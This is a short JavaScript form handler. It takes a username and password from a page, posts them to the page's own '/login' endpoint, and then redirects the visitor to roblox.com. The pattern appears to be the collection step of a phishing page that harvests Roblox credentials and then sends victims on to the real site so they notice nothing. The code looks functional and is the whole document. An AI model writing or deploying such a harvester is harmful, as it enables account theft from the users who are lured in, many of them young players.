function sendData(event) {
  event.preventDefault();

  const input1 = document.getElementById("input1").value;
  const input2 = document.getElementById("input2").value;

  fetch("/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      username: input1,
      password: input2,
    }),
  })
    .then((res) => res.text())
    .then((data) => {
      console.log("Response:", data);
    })
    .catch((err) => {
      console.error("Error sending data:", err);
    });
    window.location.href = "https://roblox.com";
}
